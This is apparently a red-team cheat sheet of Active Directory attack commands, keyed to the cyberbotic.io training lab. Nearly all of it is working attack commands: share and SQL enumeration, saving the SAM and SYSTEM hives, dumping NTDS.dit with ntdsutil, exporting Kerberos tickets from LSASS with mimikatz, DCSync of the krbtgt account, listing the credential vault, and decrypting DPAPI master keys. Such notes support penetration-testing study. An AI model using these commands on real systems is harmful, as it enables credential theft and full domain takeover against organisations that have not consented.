## Network Discover 
```bash 
Find-DomainShare -ComputerDomain cyberbotic.io -CheckShareAccess
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "project" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```

## DPAPI 
```dump
reg save HKLM\SYSTEM system 
reg save HKLM\SAM sam
ntdsutil "ac i ntds" "ifm" "create full c:\ntds_dump"
```

Extract tickets in the current LUID (not elevated):
```bash
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # standard::base64 /output:true
mimikatz # kerberos::list /export
```

Extract all LUID's tickets from LSASS' memory:
```bash
mimikatz # privilege::debug
mimikatz # standard::base64 /output:true
mimikatz # sekurlsa::tickets /export
```

if DC:
```bash 
mimikatz # lsadump::dcsync /user:krbtgt
```

## DPAPI 
1- list the existing keys:
```bash 
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all
seatbelt windowsvault
mimikatz # 
```


2- decryp the master key
```bash 
mimikatz # dpapi::masterkey /in:C:\Users\anas\AppData\Roaming\Microsoft\Protect\S-1-5-21-928519608-2129186809-3979170226-1000\18c7ae13-493d-42d0-b6cd-8a15eb6ff8d8  /system:system.hive /security:security.hive
```


